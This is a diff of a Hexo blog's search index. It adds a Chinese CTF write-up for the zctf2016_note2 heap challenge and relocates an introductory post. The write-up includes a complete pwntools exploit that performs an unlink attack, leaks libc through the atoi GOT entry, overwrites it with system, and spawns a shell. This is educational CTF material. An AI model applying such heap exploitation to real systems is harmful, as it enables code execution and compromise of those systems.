@@ -1,18 +1,43 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Why begins?</title>
-    <url>/archives/84551bc4.html</url>
-    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>前几天做题的时候，愈发觉得脑子不足以记下那么多的细节，总是害怕自己忘了，下次要用就想不起来。于是想到开个博客记录一下自己折腾的经历，帮助自己之后回顾题目。</p>
-<p>以前遇到问题在网上搜的时候，有好多博客给了我很大的帮助，所以我也希望我的博客能给同道们一点小小的启发。</p>
-<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>这个博客将主要记录我做题的经历、折腾电脑的过程、以及各种学习笔记吧，可能还会有一些生活的记录。</p>
-<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>请移步<a href="https://innerway-xq.github.io/about/">这里</a></p>
-<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>可在下方评论，或者以各种方式联系我</p>
-<h4 id="小站初建，多有不足，还望见谅"><a href="#小站初建，多有不足，还望见谅" class="headerlink" title="小站初建，多有不足，还望见谅"></a>小站初建，多有不足，还望见谅</h4><hr>
-<h4 id="Hack-for-Fun"><a href="#Hack-for-Fun" class="headerlink" title="Hack for Fun"></a>Hack for Fun</h4>]]></content>
+    <title>zctf2016_note2——对ctfwiki上wp的一点想法</title>
+    <url>/archives/75e0b21a.html</url>
+    <content><![CDATA[<h2 id="learnheap-zctf2016-note2"><a href="#learnheap-zctf2016-note2" class="headerlink" title="learnheap - zctf2016_note2"></a>learnheap - zctf2016_note2</h2><p>对于ctfwiki上的wp，我感觉他构造的堆过于复杂了，没有必要，这里写一下我的想法。</p>
+<p>（如有错误，请指出</p>
+<span id="more"></span>
+
+<hr>
+<p><a href="https://buuoj.cn/challenges#zctf2016_note2"><strong>题目链接</strong></a></p>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#2016-zctf-note2"><strong>ctfwiki wp</strong></a></p>
+<p>对于ctfwiki上的wp，我感觉他构造的堆过于复杂了，没有必要，这里写一下我的想法。</p>
+<p>（如有错误，请指出</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题堆不能直接溢出，只有申请大小为0的note的时候才能溢出，那么就在两个大堆块直接放一个可以溢出的堆块，伪造堆块和溢出修改分两步做，即可完成unlink攻击</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="申请三个note"><a href="#申请三个note" class="headerlink" title="申请三个note"></a>申请三个note</h3><p>依次申请0x80，0x0，0x80大小的堆块，并且填入数据，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk)</span><br><span class="line">newnote(<span class="number">0x80</span>,payload)</span><br><span class="line">newnote(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样的话，堆块信息如下图：</p>
+<p><img src="https://s2.loli.net/2022/02/26/VvwzphFoANTmOKt.jpg"></p>
+<p>到这里，伪造只做了一半，还要把后面一个堆块的prevsize和prev_inuse位伪造好</p>
+<h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>因为0x20大小的堆块free后会在fastbin中，下一次申请同样大小的堆块就会拿到之前那个堆块，从而进行溢出</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>堆块就变成了这样：</p>
+<p><img src="https://s2.loli.net/2022/02/26/DfudcYFqXR6G8is.jpg"></p>
+<p>此时，只要把chunk2释放掉，就会触发unlink</p>
+<p><a href="https://github.com/Niatruc/pwn_test/blob/master/unsafe_unlink/%E7%AC%94%E8%AE%B0.md">unlink参考</a></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;node4.buuoj.cn&quot;,29218)</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Input your name:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Input your address:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span>(<span class="params">length, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;2.append]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">note_addr_list = <span class="number">0x602120</span></span><br><span class="line">fakefd = note_addr_list-<span class="number">0x18</span></span><br><span class="line">fakebk = note_addr_list-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk)</span><br><span class="line">newnote(<span class="number">0x80</span>,payload)</span><br><span class="line">newnote(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot; is &quot;</span>)</span><br><span class="line">atoi_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;atoi:&quot;</span> + <span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">libc_addr = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
       <categories>
-        <category>杂</category>
+        <category>learnheap</category>
       </categories>
+      <tags>
+        <tag>unlink</tag>
+        <tag>heap</tag>
+      </tags>
   </entry>
   <entry>
     <title>applestore</title>
@@ -239,7 +264,7 @@
       </categories>
       <tags>
         <tag>uaf</tag>
-        <tag>堆利用</tag>
+        <tag>heap</tag>
       </tags>
   </entry>
   <entry>
@@ -512,6 +537,20 @@ D --&gt; C
       <tags>
         <tag>shellcode</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Why begins?</title>
+    <url>/archives/84551bc4.html</url>
+    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>前几天做题的时候，愈发觉得脑子不足以记下那么多的细节，总是害怕自己忘了，下次要用就想不起来。于是想到开个博客记录一下自己折腾的经历，帮助自己之后回顾题目。</p>
+<p>以前遇到问题在网上搜的时候，有好多博客给了我很大的帮助，所以我也希望我的博客能给同道们一点小小的启发。</p>
+<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>这个博客将主要记录我做题的经历、折腾电脑的过程、以及各种学习笔记吧，可能还会有一些生活的记录。</p>
+<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>请移步<a href="https://innerway-xq.github.io/about/">这里</a></p>
+<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>可在下方评论，或者以各种方式联系我</p>
+<h4 id="小站初建，多有不足，还望见谅"><a href="#小站初建，多有不足，还望见谅" class="headerlink" title="小站初建，多有不足，还望见谅"></a>小站初建，多有不足，还望见谅</h4><hr>
+<h4 id="Hack-for-Fun"><a href="#Hack-for-Fun" class="headerlink" title="Hack for Fun"></a>Hack for Fun</h4>]]></content>
+      <categories>
+        <category>杂</category>
+      </categories>
   </entry>
   <entry>
     <title>Start</title>
